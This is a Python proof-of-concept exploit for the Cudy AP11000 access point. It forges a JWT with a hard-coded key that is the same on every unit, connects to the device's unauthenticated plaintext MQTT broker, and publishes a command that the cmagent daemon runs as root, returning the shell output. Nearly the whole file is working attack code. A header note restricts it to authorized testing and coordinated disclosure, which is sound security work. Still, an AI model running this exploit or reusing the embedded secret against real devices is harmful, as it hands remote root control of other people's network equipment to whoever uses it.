#!/usr/bin/env python3
"""Cudy AP11000 cmagent MQTT root command execution proof of concept.

For owner-authorized testing and coordinated disclosure only. Run it against
hardware you own.

The AP runs mosquitto bound to 0.0.0.0 on ports 1883 and 8883. The 1883 listener
is plaintext and needs no client certificate; the only credential check is an
HS256 JWT signed with a key compiled into /usr/sbin/cmagent, identical on every
unit. The cmagent daemon runs as root and subscribes to the command topic space.
Its handler, /usr/lib/lua/cmagent/router/command.lua, passes the JSON "cmd" field
straight to io.popen, so a single publish yields root command execution.

The handler's only input check is that the id taken from the topic equals
000000000000, which is a standalone or root AP's own MQTT id, so the check is
satisfied by default.

Requires nothing but the standard library. No prior access to the target.
"""
import argparse
import base64
import hashlib
import hmac
import json
import socket
import sys
import time

MQTT_SECRET = 'CLOUDmqttabc&123'
ADMIN_USER = 'admincudydevice'
SELF_ID = '000000000000'
SYS_CLIENTS = '$SYS/broker/clients/connected'


# --- MQTT 3.1.1 wire format, just enough of it -----------------------------

def _b64u(raw):
    return base64.urlsafe_b64encode(raw).rstrip(b'=').decode()


def make_jwt(user, secret=MQTT_SECRET, ttl=3600):
    header = _b64u(b'{"typ":"JWT","alg":"HS256"}')
    claims = _b64u(json.dumps({'username': user, 'exp': int(time.time()) + ttl},
                              separators=(',', ':')).encode())
    signing_input = f'{header}.{claims}'.encode()
    sig = _b64u(hmac.new(secret.encode(), signing_input, hashlib.sha256).digest())
    return f'{header}.{claims}.{sig}'


def _str(value):
    if isinstance(value, str):
        value = value.encode()
    return len(value).to_bytes(2, 'big') + value


def _rem_len(n):
    out = b''
    while True:
        digit = n & 127
        n >>= 7
        out += bytes([digit | 128]) if n else bytes([digit])
        if not n:
            return out


def _packet(kind, body):
    return bytes([kind]) + _rem_len(len(body)) + body


def connect_packet(client_id, user, token, keepalive=30):
    body = (_str('MQTT') + bytes([4, 0xC2]) + keepalive.to_bytes(2, 'big')
            + _str(client_id) + _str(user) + _str(token))
    return _packet(0x10, body)


def subscribe_packet(topic, mid=1):
    return _packet(0x82, mid.to_bytes(2, 'big') + _str(topic) + b'\x00')


def publish_packet(topic, payload):
    return _packet(0x30, _str(topic) + payload)


class Conn:
    """Blocking MQTT client with a single-byte-at-a-time framing reader."""

    def __init__(self, host, port, timeout):
        self.sock = socket.create_connection((host, port), timeout)
        self.sock.settimeout(timeout)
        self.buf = b''

    def send(self, data):
        self.sock.sendall(data)

    def _fill(self, n):
        while len(self.buf) < n:
            chunk = self.sock.recv(max(n - len(self.buf), 2048))
            if not chunk:
                raise EOFError('broker closed the connection')
            self.buf += chunk

    def _take(self, n):
        self._fill(n)
        out, self.buf = self.buf[:n], self.buf[n:]
        return out

    def read(self):
        """Return (packet_type_nibble, flags, body)."""
        head = self._take(1)[0]
        mult, length = 1, 0
        while True:
            byte = self._take(1)[0]
            length += (byte & 127) * mult
            if not byte & 128:
                break
            mult *= 128
            if mult > 128 ** 3:
                raise ValueError('malformed remaining length')
        return head >> 4, head & 0x0F, self._take(length)

    def close(self):
        try:
            self.send(_packet(0xE0, b''))
        except OSError:
            pass
        self.sock.close()


CONNACK_REASONS = {
    1: 'unacceptable protocol version',
    2: 'client id rejected',
    3: 'server unavailable',
    4: 'bad username or password (the static JWT was rejected)',
    5: 'not authorised',
}


def decode_publish(flags, body):
    tlen = int.from_bytes(body[:2], 'big')
    topic = body[2:2 + tlen].decode('latin1')
    rest = body[2 + tlen:]
    if (flags >> 1) & 3:                      # QoS 1 or 2 carries a packet id
        rest = rest[2:]
    return topic, rest


def connect(host, port, timeout, client_id=None):
    conn = Conn(host, port, timeout)
    cid = client_id or f'poc{int(time.time() * 1000) & 0xffffff:06x}'
    conn.send(connect_packet(cid, ADMIN_USER, make_jwt(ADMIN_USER)))
    kind, _, body = conn.read()
    if kind != 2:
        conn.close()
        raise RuntimeError(f'expected CONNACK, got packet type {kind}')
    if body[1] != 0:
        conn.close()
        raise RuntimeError('CONNACK refused: '
                           + CONNACK_REASONS.get(body[1], f'code {body[1]}'))
    return conn


def subscribe(conn, topic, timeout):
    conn.send(subscribe_packet(topic))
    deadline = time.time() + timeout
    while time.time() < deadline:
        kind, flags, body = conn.read()
        if kind == 9:
            if body[2] == 0x80:
                raise RuntimeError(f'subscription to {topic} denied by broker ACL')
            return
    raise TimeoutError('no SUBACK from broker')


# --- the two operations ----------------------------------------------------

def check(host, port, timeout):
    """Read-only: how many clients are attached to the broker."""
    conn = connect(host, port, timeout)
    try:
        subscribe(conn, SYS_CLIENTS, timeout)
        deadline = time.time() + timeout
        while time.time() < deadline:
            kind, flags, body = conn.read()
            if kind == 3:
                _, payload = decode_publish(flags, body)
                count = payload.decode('latin1').strip()
                note = ('only this client, no cmagent attached' if count == '1'
                        else 'an agent is attached, command topic has a consumer')
                return f'clients connected: {count} ({note})'
        return 'subscribed but the broker sent no $SYS value'
    finally:
        conn.close()


def run(host, port, timeout, command, prefix='router'):
    """Publish one command and return the root shell output."""
    # As admincudydevice the broker allows writing router/+/000000000000/...
    # and reading router/000000000000/..., so request and reply share a topic.
    reply_filter = f'{prefix}/{SELF_ID}/+/+/+/+'
    seq = int(time.time()) & 0xFFFFFFFF
    topic = f'{prefix}/{SELF_ID}/{SELF_ID}/{seq}/router/command'
    payload = json.dumps({'cmd': command, 'reply': 1},
                         separators=(',', ':')).encode() + b'\x00'

    conn = connect(host, port, timeout)
    try:
        subscribe(conn, reply_filter, timeout)
        conn.send(publish_packet(topic, payload))
        deadline = time.time() + timeout
        while time.time() < deadline:
            kind, flags, body = conn.read()
            if kind != 3:
                continue
            _, raw = decode_publish(flags, body)
            try:
                msg = json.loads(raw.rstrip(b'\x00').decode('utf-8', 'replace'))
            except ValueError:
                continue
            if isinstance(msg, dict) and 'data' in msg:   # skip our own echo
                return msg.get('data', '')
        raise TimeoutError('no reply; the agent may not be subscribed '
                           '(run --check first)')
    finally:
        conn.close()


def selftest():
    assert _rem_len(0) == b'\x00'
    assert _rem_len(127) == b'\x7f'
    assert _rem_len(128) == b'\x80\x01'
    assert _rem_len(16383) == b'\xff\x7f'
    assert _rem_len(16384) == b'\x80\x80\x01'
    assert _str('MQTT') == b'\x00\x04MQTT'

    token = make_jwt(ADMIN_USER)
    head, claims, sig = token.split('.')
    assert '=' not in token
    pad = lambda s: s + '=' * (-len(s) % 4)
    assert json.loads(base64.urlsafe_b64decode(pad(head)))['alg'] == 'HS256'
    assert json.loads(base64.urlsafe_b64decode(pad(claims)))['username'] == ADMIN_USER
    expect = _b64u(hmac.new(MQTT_SECRET.encode(), f'{head}.{claims}'.encode(),
                            hashlib.sha256).digest())
    assert sig == expect, 'JWT signature mismatch'

    pkt = _packet(0x10, b'x' * 200)
    assert pkt[0] == 0x10 and pkt[1:3] == b'\xc8\x01' and len(pkt) == 203

    # framing round trip, including a fragmented read
    class FakeSock:
        def __init__(self, data):
            self.data, self.timeout = data, None

        def settimeout(self, _):
            pass

        def recv(self, _n):
            out, self.data = self.data[:3], self.data[3:]
            return out

    body = _str('a/b/c') + b'\x01\x02' + b'{"data":"root\\n"}'
    wire = _packet(0x32, body)                    # PUBLISH, QoS 1
    conn = Conn.__new__(Conn)
    conn.sock, conn.buf = FakeSock(wire), b''
    kind, flags, got = conn.read()
    assert kind == 3 and (flags >> 1) & 3 == 1
    topic, payload = decode_publish(flags, got)
    assert topic == 'a/b/c'
    assert json.loads(payload)['data'] == 'root\n'
    print('selftest ok')


def main():
    ap = argparse.ArgumentParser(
        description='Cudy AP cmagent MQTT root command execution PoC.',
        epilog='Authorized testing only. Use on hardware you own.')
    ap.add_argument('host', nargs='?', help='target AP address')
    ap.add_argument('command', nargs='?', help='shell command to run as root')
    ap.add_argument('-p', '--port', type=int, default=1883,
                    help='broker port (default 1883, the plaintext listener)')
    ap.add_argument('-t', '--timeout', type=float, default=8.0)
    ap.add_argument('--prefix', default='router', help='cmagent.mqtt.prefix')
    ap.add_argument('--check', action='store_true',
                    help='read-only reachability check, publishes nothing')
    ap.add_argument('--selftest', action='store_true',
                    help='offline checks, no network')
    args = ap.parse_args()

    if args.selftest:
        selftest()
        return 0
    if not args.host:
        ap.error('host is required')
    if args.check:
        print(check(args.host, args.port, args.timeout))
        return 0
    if not args.command:
        ap.error('command is required unless --check or --selftest is given')

    out = run(args.host, args.port, args.timeout, args.command, args.prefix)
    sys.stdout.write(out if out.endswith('\n') or not out else out + '\n')
    return 0


if __name__ == '__main__':
    try:
        sys.exit(main())
    except (RuntimeError, TimeoutError, EOFError, OSError) as exc:
        sys.exit(f'{type(exc).__name__}: {exc}')
